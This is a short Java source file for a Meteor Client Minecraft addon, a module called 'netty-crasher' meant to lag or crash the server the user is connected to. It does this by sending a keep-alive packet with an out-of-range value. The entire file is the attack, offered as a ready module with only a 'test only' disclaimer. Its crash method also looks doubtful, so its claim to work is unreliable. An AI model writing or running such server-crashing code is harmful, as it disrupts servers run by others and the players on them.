package com.example.addon.modules;

import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.systems.modules.Category;
import net.minecraft.network.packet.c2s.play.ClientKeepAliveC2SPacket;

import static com.example.addon.AddonTemplate.CATEGORY;
import static meteordevelopment.meteorclient.MeteorClient.mc;

public class TheMinjaeNettyCrasher extends Module {
    public TheMinjaeNettyCrasher() {
        super(CATEGORY, "netty-crasher", "Sends invalid packets to cause lag or crash (test only!)");
    }

    @Override
    public void onActivate() {
        long invalidValue = Long.MAX_VALUE;
        mc.getNetworkHandler().sendPacket(new ClientKeepAliveC2SPacket(invalidValue));
        toggle(); // 한 번 실행하고 끄기
    }
}
